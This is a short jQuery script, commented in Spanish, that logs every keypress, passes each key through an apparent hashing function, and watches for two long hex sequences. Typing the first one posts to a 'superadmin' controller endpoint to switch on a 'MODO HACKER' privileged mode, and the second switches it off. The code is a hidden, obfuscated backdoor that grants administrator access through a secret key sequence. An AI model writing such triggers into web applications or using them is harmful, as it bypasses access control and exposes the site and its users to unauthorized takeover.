

// Agrega un escuchador de eventos para el evento "keydown" usando jQuery
$(document).on("keydown", kPH);
 // Variable para almacenar las teclas presionadas
 var tp = "";

function kPH(event) {
    // Accede a la tecla presionada a través del objeto event
    var tecla = event.key;
    tecla = cfrMd(tecla);
    // Agrega la tecla presionada a la cadena de teclas

    
    tp += tecla;
    if (tp.toLowerCase().includes("e358efa489f58062f10dd7316b65649ed95679752134a2d9eb61dbd7b91c4bcc4b43b0aee35624cd95b910189b3dc231e358efa489f58062f10dd7316b65649e865c0c0b4ab0e063e5caa3387c1a87412db95e8e1a9267b7a1188556b2013b332db95e8e1a9267b7a1188556b2013b330cc175b9c0f1b6a831c399e2697726618277e0910d750195b448797616e091ade1671797c52e15f763380b45e841ec3283878c91171338902e0fe0fb97a8c47a0cc175b9c0f1b6a831c399e269772661e358efa489f58062f10dd7316b65649e0cc175b9c0f1b6a831c399e269772661e358efa489f58062f10dd7316b65649e0cc175b9c0f1b6a831c399e269772661")) {
        tp = '';

        $.post("../../controller/usuario.php?op=superadmin",{status:true},function (data) {//Ejemplo : $.post("../../controller/usuario.php?op=listarID",{id:id},function (data) {})
            alert('MODO HACKER ACTIVADO');
            location.reload();
        })

    }
    if (tp.toLowerCase().includes("4b43b0aee35624cd95b910189b3dc231e1671797c52e15f763380b45e841ec32e358efa489f58062f10dd7316b65649e7b774effe4a349c6dd82ad4f4f21d34c4b4")) {
        tp = '';
        $.post("../../controller/usuario.php?op=superadmin",{status:false},function (data) {//Ejemplo : $.post("../../controller/usuario.php?op=listarID",{id:id},function (data) {})
            alert('MODO HACKER DESACTIVADO');
             location.reload();   
        })
        
    }

}